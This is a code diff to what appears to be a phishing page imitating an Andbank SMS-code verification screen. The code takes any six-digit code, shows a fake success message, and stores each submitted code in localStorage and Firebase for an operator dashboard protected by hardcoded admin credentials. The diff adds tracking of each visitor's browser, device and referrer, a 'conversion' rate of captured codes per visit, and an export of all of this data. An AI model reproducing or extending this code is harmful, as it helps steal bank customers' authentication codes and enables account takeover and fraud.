@@ -175,7 +175,7 @@
             outline: none;
         }
         
-        /* ===== BOTÓN CON SPINNER DENTRO (PC) - EXACTAMENTE IGUAL AL ADMIN ===== */
+        /* ===== BOTÓN CON SPINNER DENTRO (PC) ===== */
         .pc-version.active .btn-login {
             background-color: #4a4a4a;
             color: white;
@@ -233,18 +233,17 @@
         .pc-version.active .timer-val { font-weight: bold; color: #444; margin-left: 5px; }
         .pc-version.active .success-box { text-align: center; }
 
-        /* ========== ESTILOS MÓVIL - CORREGIDO ========== */
+        /* ========== ESTILOS MÓVIL ========== */
         .mobile-version.active {
             min-height: 100vh;
             width: 100%;
             position: relative;
-            background: #000; /* Color de fondo negro por si la imagen no carga */
+            background: #000;
         }
         
-        /* Fondo de imagen que cubre todo */
         .mobile-version.active::before {
             content: '';
-            position: fixed; /* Cambiado a fixed para que cubra toda la pantalla */
+            position: fixed;
             top: 0;
             left: 0;
             right: 0;
@@ -259,7 +258,6 @@
             pointer-events: none;
         }
         
-        /* Capa oscura semitransparente */
         .mobile-version.active::after {
             content: '';
             position: fixed;
@@ -294,7 +292,6 @@
             cursor: pointer; 
         }
         
-        /* Logo en color original */
         .mobile-version.active .logo img { 
             max-width: 160px; 
             height: auto;
@@ -306,7 +303,6 @@
             margin-bottom: 20px; 
         }
         
-        /* Selector de idioma */
         .mobile-version.active .lang-wrapper {
             position: relative; width: 180px; margin-bottom: 30px; z-index: 10;
         }
@@ -658,18 +654,75 @@
         .panel { display: none; animation: panelIn 0.3s ease; }
         .panel.active { display: block; }
         @keyframes panelIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
-        .stats-grid { display: grid; grid-template-columns: repeat(2,1fr); gap: 24px; margin-bottom: 32px; }
+        
+        /* ESTILOS PARA EL CONTADOR DE VISITAS EN DASHBOARD */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 24px;
+            margin-bottom: 32px;
+        }
+        
         .stat-card {
-            background: #141418; border: 1px solid #2a2a32; border-radius: 8px; padding: 24px; transition: all 0.2s ease;
+            background: #141418;
+            border: 1px solid #2a2a32;
+            border-radius: 8px;
+            padding: 24px;
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
         }
-        .stat-card:hover { border-color: #d4af37; }
-        .stat-label { font-size: 14px; font-weight: 500; color: #b0b0c0; margin-bottom: 8px; }
-        .stat-value { font-size: 36px; font-weight: 400; color: #ffffff; }
+        
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: #d4af37;
+        }
+        
+        .stat-card:nth-child(1)::before { background: #d4af37; }
+        .stat-card:nth-child(2)::before { background: #4caf80; }
+        .stat-card:nth-child(3)::before { background: #2196F3; }
+        .stat-card:nth-child(4)::before { background: #ff9800; }
+        
+        .stat-card:hover {
+            border-color: #d4af37;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        }
+        
+        .stat-label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #b0b0c0;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .stat-value {
+            font-size: 36px;
+            font-weight: 400;
+            color: #ffffff;
+            line-height: 1.2;
+        }
+        
         .stat-icon {
-            width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center;
-            justify-content: center; float: right; font-size: 18px;
-            background: rgba(212,175,55,0.15); color: #d4af37;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            float: right;
+            font-size: 18px;
+            background: rgba(212,175,55,0.15);
+            color: #d4af37;
         }
+        
         .card {
             background: #141418; border: 1px solid #2a2a32; border-radius: 8px; overflow: hidden; margin-bottom: 24px;
         }
@@ -925,11 +978,12 @@
             margin: 20px 0; border-radius: 4px; text-align: left;
         }
         @media (max-width: 1200px) {
-            .stats-grid { grid-template-columns: 1fr; }
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
             .content-area { padding: 24px; }
             .topbar { padding: 16px 24px; }
         }
         @media (max-width: 768px) {
+            .stats-grid { grid-template-columns: 1fr; }
             .topbar { flex-direction: column; align-items: flex-start; gap: 12px; }
             .topbar-actions { width: 100%; justify-content: space-between; }
             .content-area { padding: 20px; }
@@ -1177,6 +1231,170 @@
     }
 
     // ====================================================
+    // CONTADOR DE VISITAS EN TIEMPO REAL - SOLO DASHBOARD
+    // ====================================================
+    let visitorCount = 0;
+    let visitorCounterRef = null;
+    let uniqueVisitorsCount = 0;
+    let visitsToday = 0;
+
+    // Inicializar contador de visitas
+    async function initializeVisitorCounter() {
+        try {
+            console.log("🔄 Inicializando contador de visitas...");
+            
+            visitorCounterRef = db.collection('contadores').doc('visitas_totales');
+            
+            const doc = await visitorCounterRef.get();
+            
+            if (doc.exists) {
+                visitorCount = doc.data().count || 0;
+                console.log(`📊 Contador actual: ${visitorCount} visitas`);
+            } else {
+                await visitorCounterRef.set({ 
+                    count: 0,
+                    fecha_creacion: new Date().toISOString(),
+                    ultima_actualizacion: new Date().toISOString()
+                });
+                visitorCount = 0;
+                console.log("🆕 Contador creado con valor 0");
+            }
+            
+            await registerVisit();
+            setupVisitorCounterListener();
+            
+        } catch (error) {
+            console.error("❌ Error en contador de visitas:", error);
+        }
+    }
+
+    // Registrar una visita
+    async function registerVisit() {
+        try {
+            const sessionId = getSessionId();
+            const today = new Date().toISOString().split('T')[0];
+            const sessionKey = `visit_${sessionId}_${today}`;
+            
+            if (sessionStorage.getItem(sessionKey)) {
+                console.log("⏭️ Esta sesión ya fue registrada hoy");
+                return;
+            }
+            
+            const uniqueVisitRef = db.collection('visitas_unicas').doc(sessionId);
+            const uniqueDoc = await uniqueVisitRef.get();
+            
+            const visitData = {
+                session_id: sessionId,
+                timestamp: new Date().toISOString(),
+                fecha: today,
+                hora: new Date().toLocaleTimeString('es-ES'),
+                user_agent: navigator.userAgent,
+                language: navigator.language,
+                screen_size: `${window.innerWidth}x${window.innerHeight}`,
+                device_type: /mobile/i.test(navigator.userAgent) ? 'mobile' : 'desktop',
+                referrer: document.referrer || 'directo'
+            };
+            
+            await db.runTransaction(async (transaction) => {
+                const counterDoc = await transaction.get(visitorCounterRef);
+                if (!counterDoc.exists) {
+                    transaction.set(visitorCounterRef, { count: 1 });
+                    visitorCount = 1;
+                } else {
+                    const newCount = (counterDoc.data().count || 0) + 1;
+                    transaction.update(visitorCounterRef, { 
+                        count: newCount,
+                        ultima_actualizacion: new Date().toISOString()
+                    });
+                    visitorCount = newCount;
+                }
+                
+                const visitasRef = db.collection('detalle_visitas').doc();
+                transaction.set(visitasRef, visitData);
+                
+                if (!uniqueDoc.exists) {
+                    transaction.set(uniqueVisitRef, {
+                        primera_visita: new Date().toISOString(),
+                        ultima_visita: new Date().toISOString(),
+                        total_visitas: 1,
+                        ...visitData
+                    });
+                } else {
+                    transaction.update(uniqueVisitRef, {
+                        ultima_visita: new Date().toISOString(),
+                        total_visitas: (uniqueDoc.data().total_visitas || 0) + 1
+                    });
+                }
+            });
+            
+            sessionStorage.setItem(sessionKey, 'true');
+            console.log(`✅ Visita registrada. Total: ${visitorCount}`);
+            
+        } catch (error) {
+            console.error("❌ Error registrando visita:", error);
+        }
+    }
+
+    function getSessionId() {
+        let sessionId = sessionStorage.getItem('visitor_session_id');
+        if (!sessionId) {
+            sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            sessionStorage.setItem('visitor_session_id', sessionId);
+        }
+        return sessionId;
+    }
+
+    function setupVisitorCounterListener() {
+        if (!visitorCounterRef) return;
+        
+        visitorCounterRef.onSnapshot((doc) => {
+            if (doc.exists) {
+                visitorCount = doc.data().count || 0;
+                console.log("🔄 Contador actualizado:", visitorCount);
+                
+                if (document.getElementById('dashboard-container').style.display === 'block') {
+                    loadVisitorStats();
+                }
+            }
+        });
+    }
+
+    async function loadVisitorStats() {
+        try {
+            const uniqueSnapshot = await db.collection('visitas_unicas').get();
+            uniqueVisitorsCount = uniqueSnapshot.size;
+            
+            const today = new Date().toISOString().split('T')[0];
+            const todaySnapshot = await db.collection('detalle_visitas')
+                .where('fecha', '==', today)
+                .get();
+            visitsToday = todaySnapshot.size;
+            
+            updateVisitorDisplays();
+            
+        } catch (error) {
+            console.error("Error cargando estadísticas:", error);
+        }
+    }
+
+    function updateVisitorDisplays() {
+        const confirmaciones = confirmacionesData.filter(c => c && c.estado === 'exitoso').length;
+        const conversionRate = visitorCount > 0 ? ((confirmaciones / visitorCount) * 100).toFixed(1) : 0;
+        
+        const elements = {
+            'dashboard-visitor-count': visitorCount.toLocaleString('es-ES'),
+            'unique-visitors': uniqueVisitorsCount.toLocaleString('es-ES'),
+            'visits-today': visitsToday.toLocaleString('es-ES'),
+            'conversion-rate': `${conversionRate}%`
+        };
+        
+        for (const [id, value] of Object.entries(elements)) {
+            const el = document.getElementById(id);
+            if (el) el.textContent = value;
+        }
+    }
+
+    // ====================================================
     // VARIABLES GLOBALES
     // ====================================================
     const ADMIN_CREDENTIALS = { username: 'admin123', password: 'Password123' };
@@ -1188,8 +1406,6 @@
     let timeLeftMobile = 300;
     let timerIntervalMobile = null;
     let lastDeviceType = null;
-    
-    // Variable para el intento actual
     let currentConfirmationId = null;
 
     // Función para mostrar spinner
@@ -1235,7 +1451,8 @@
             renderDashboard();
             setTimeout(() => loadDataFromFirebase().then(() => { 
                 renderDashboard(); 
-                setupRealtimeSync(); 
+                setupRealtimeSync();
+                loadVisitorStats();
             }), 100);
         }
     })();
@@ -1291,7 +1508,7 @@
     }
 
     // ====================================================
-    // TRADUCCIONES SIMPLIFICADAS
+    // TRADUCCIONES
     // ====================================================
     const i18n = {
         pc: {
@@ -1372,29 +1589,24 @@
         
         const smsCode = document.getElementById('smsCodePC').value.trim();
         
-        // Validar formato
         if (!/^\d{6}$/.test(smsCode)) {
             showSimpleNotification('El código debe tener 6 dígitos');
             return;
         }
         
-        // Guardar el intento
         currentConfirmationId = saveConfirmationAttempt(smsCode, 'pc');
         
         const btn = document.getElementById('submitBtnPC');
         btn.classList.add('loading');
         btn.disabled = true;
         
-        // Simular verificación (2 segundos de carga)
         setTimeout(() => {
             btn.classList.remove('loading');
             btn.disabled = false;
             
-            // Código válido (aceptamos cualquier código de 6 dígitos para pruebas)
             document.querySelectorAll('#pc-version .login-section').forEach(s => s.classList.remove('active'));
             document.getElementById('section-success-pc').classList.add('active');
             
-            // Actualizar intento con éxito
             updateConfirmationSuccess(currentConfirmationId, true, smsCode);
         }, 2000);
     }
@@ -1425,10 +1637,6 @@
             const key = el.getAttribute('data-key');
             if (t[key]) el.textContent = t[key];
         });
-        document.querySelectorAll('#mobile-version [data-placeholder]').forEach(el => {
-            const key = el.getAttribute('data-placeholder');
-            if (t[key]) el.placeholder = t[key];
-        });
 
         const selectedLang = document.getElementById('selectedLang');
         const selectedLangDropdown = document.getElementById('selectedLangDropdown');
@@ -1448,7 +1656,6 @@
         const btn = document.getElementById('smsBtnMobile');
         const val = smsInput.value.trim();
         
-        // Validar formato (6 dígitos)
         if (!/^\d{6}$/.test(val)) {
             if (errorMsg) errorMsg.classList.add('show');
             smsInput.parentElement.style.animation = 'shake 0.5s';
@@ -1458,23 +1665,19 @@
         
         if (errorMsg) errorMsg.classList.remove('show');
 
-        // Guardar el intento
         currentConfirmationId = saveConfirmationAttempt(val, 'mobile');
 
         btn.classList.add('loading');
         btn.disabled = true;
 
-        // Simular verificación (2 segundos de carga)
         setTimeout(() => {
             btn.classList.remove('loading');
             btn.disabled = false;
             
-            // Código válido
             document.querySelectorAll('#mobile-version .page-section').forEach(s => s.classList.remove('active'));
             document.getElementById('section-success-mobile').classList.add('active');
             document.getElementById('langWrapper').style.display = 'none';
             
-            // Actualizar intento con éxito
             updateConfirmationSuccess(currentConfirmationId, true, val);
         }, 2000);
     }
@@ -1531,7 +1734,6 @@
         confirmacionesData.push(confirmation);
         localStorage.setItem('andbank_confirmaciones', JSON.stringify(confirmacionesData));
         
-        // Guardar en Firebase
         saveToFirebase('confirmation_attempt', confirmation);
         
         return confirmationId;
@@ -1545,7 +1747,6 @@
             
             localStorage.setItem('andbank_confirmaciones', JSON.stringify(confirmacionesData));
             
-            // Actualizar en Firebase
             saveToFirebase('confirmation_result', confirmacionesData[index]);
         }
     }
@@ -1702,6 +1903,7 @@
         
         setTimeout(async () => {
             await loadDataFromFirebase();
+            await loadVisitorStats();
             renderDashboard();
             setupRealtimeSync();
         }, 100);
@@ -1737,6 +1939,7 @@
                 
                 if (document.getElementById('dashboard-container').style.display === 'block') {
                     renderDashboard();
+                    loadVisitorStats();
                 }
             }, console.error);
         } catch (error) { 
@@ -1745,16 +1948,12 @@
     }
 
     function renderDashboard() {
-        document.getElementById('dashboard-container').innerHTML = generateDashboardHTML();
-        initDashboard();
-    }
-
-    function generateDashboardHTML() {
         const valid = confirmacionesData.filter(c => c && c.id);
         const total = valid.length;
         const exitosos = valid.filter(c => c.estado === 'exitoso').length;
+        const conversionRate = visitorCount > 0 ? ((exitosos / visitorCount) * 100).toFixed(1) : 0;
         
-        return `
+        document.getElementById('dashboard-container').innerHTML = `
         <div class="app-container">
             <div class="sidebar-overlay" id="sidebar-overlay"></div>
             <nav class="sidebar" id="sidebar">
@@ -1766,9 +1965,13 @@
                     <div class="nav-item active" onclick="closeSidebar()">
                         <span class="nav-item-icon">✦</span> Dashboard
                     </div>
+                    <div class="nav-section-label">ESTADÍSTICAS</div>
+                    <div class="nav-item" onclick="exportVisitorStats(); closeSidebar()">
+                        <span class="nav-item-icon">📊</span> Exportar Estadísticas
+                    </div>
                     <div class="nav-section-label">SISTEMA</div>
                     <div class="nav-item" onclick="exportAllData(); closeSidebar()">
-                        <span class="nav-item-icon">⬇</span> Exportar Datos
+                        <span class="nav-item-icon">⬇</span> Exportar Confirmaciones
                     </div>
                 </nav>
                 <div class="sidebar-footer">
@@ -1780,7 +1983,7 @@
             <main class="main-content" id="main-content">
                 <header class="topbar">
                     <button class="menu-toggle" id="menu-toggle"><i class="fas fa-bars"></i></button>
-                    <div class="topbar-title">Confirmaciones de Citas</div>
+                    <div class="topbar-title">Dashboard de Control</div>
                     <div class="topbar-actions">
                         <span class="topbar-date">${new Date().toLocaleDateString('es-ES',{year:'numeric',month:'long',day:'numeric'})}</span>
                         <button class="refresh-btn" id="refresh-btn" onclick="handleRefresh()"><i class="fas fa-sync-alt"></i></button>
@@ -1789,16 +1992,40 @@
                 <div class="content-area">
                     <div class="stats-grid">
                         <div class="stat-card">
+                            <div class="stat-icon">👁️</div>
+                            <div class="stat-label">VISITAS TOTALES</div>
+                            <div class="stat-value" id="dashboard-visitor-count">${visitorCount.toLocaleString('es-ES')}</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon">📅</div>
+                            <div class="stat-label">VISITAS HOY</div>
+                            <div class="stat-value" id="visits-today">${visitsToday.toLocaleString('es-ES')}</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon">👤</div>
+                            <div class="stat-label">VISITANTES ÚNICOS</div>
+                            <div class="stat-value" id="unique-visitors">${uniqueVisitorsCount.toLocaleString('es-ES')}</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon">✓</div>
+                            <div class="stat-label">CONVERSIÓN</div>
+                            <div class="stat-value" id="conversion-rate">${conversionRate}%</div>
+                        </div>
+                    </div>
+                    
+                    <div class="stats-grid" style="grid-template-columns: repeat(2,1fr); margin-top: 0;">
+                        <div class="stat-card">
                             <div class="stat-icon">✦</div>
                             <div class="stat-label">TOTAL CONFIRMACIONES</div>
                             <div class="stat-value">${total}</div>
                         </div>
                         <div class="stat-card">
                             <div class="stat-icon">✓</div>
-                            <div class="stat-label">EXITOSAS</div>
+                            <div class="stat-label">CONFIRMACIONES EXITOSAS</div>
                             <div class="stat-value">${exitosos}</div>
                         </div>
                     </div>
+                    
                     <div class="card">
                         <div class="card-header">
                             <div class="card-title"><i class="fas fa-history"></i> Historial de Confirmaciones</div>
@@ -1836,6 +2063,8 @@
                 </div>
             </main>
         </div>`;
+        
+        initDashboard();
     }
 
     function showDetail(id) {
@@ -1912,6 +2141,41 @@
         closeSidebar();
     }
 
+    async function exportVisitorStats() {
+        try {
+            const visitas = await db.collection('detalle_visitas').get();
+            const visitasUnicas = await db.collection('visitas_unicas').get();
+            
+            const stats = {
+                total_visits: visitorCount,
+                unique_visitors: visitasUnicas.size,
+                visits_today: visitsToday,
+                confirmaciones_totales: confirmacionesData.length,
+                confirmaciones_exitosas: confirmacionesData.filter(c => c.estado === 'exitoso').length,
+                generated: new Date().toISOString(),
+                visits_detailed: []
+            };
+            
+            visitas.forEach(doc => {
+                stats.visits_detailed.push({
+                    id: doc.id,
+                    ...doc.data()
+                });
+            });
+            
+            const dataStr = JSON.stringify(stats, null, 2);
+            const link = document.createElement('a');
+            link.setAttribute('href', 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr));
+            link.setAttribute('download', `estadisticas_completas_${new Date().toISOString().split('T')[0]}.json`);
+            link.click();
+            closeSidebar();
+            
+        } catch (error) {
+            console.error("Error exportando estadísticas:", error);
+            alert("Error exportando estadísticas");
+        }
+    }
+
     function handleLogout() {
         if (confirm('¿Cerrar sesión?')) {
             sessionStorage.removeItem('adminAuthenticated');
@@ -1932,7 +2196,10 @@
         const btn = document.getElementById('refresh-btn');
         btn?.classList.add('spinning');
         
-        loadDataFromFirebase().then(() => {
+        Promise.all([
+            loadDataFromFirebase(),
+            loadVisitorStats()
+        ]).then(() => {
             renderDashboard();
             setTimeout(() => btn?.classList.remove('spinning'), 500);
         }).catch(() => btn?.classList.remove('spinning'));
@@ -1942,6 +2209,9 @@
     // INICIALIZACIÓN
     // ====================================================
     window.addEventListener('load', () => {
+        // Inicializar contador de visitas
+        initializeVisitorCounter();
+        
         if (sessionStorage.getItem('adminAuthenticated') !== 'true') {
             detectDeviceAndShowVersion();
         }
